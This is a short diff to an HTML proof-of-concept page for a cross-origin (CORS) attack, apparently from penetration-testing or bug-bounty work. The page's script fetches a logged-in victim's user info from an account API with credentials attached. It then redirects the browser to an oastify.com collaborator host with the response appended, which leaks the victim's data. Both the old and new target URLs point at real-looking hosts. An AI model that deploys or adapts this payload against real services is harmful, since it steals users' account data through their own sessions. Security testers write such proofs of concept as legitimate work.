@@ -5,12 +5,12 @@
 // Victim visits this page while logged into target.com
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get', 'https://auth.stage.nadija.pp.ua/resources/master/admin/en', true);
+req.open('get', 'https://medikit-api-dev.proxy.abtollc.com/api/account/get-user-info', true);
 req.withCredentials = true;
 req.send('{}');
 
 function reqListener() {
-  location='https://h9rrq24sty9w5wusmot2qexam1ssgm4b.oastify.com/log?key='+this.responseText;
+  location='https://k8t13fu40tu3y1fqdt1noskoffl69wxl.oastify.com/log?key='+this.responseText;
 };
 </script>
 </body>
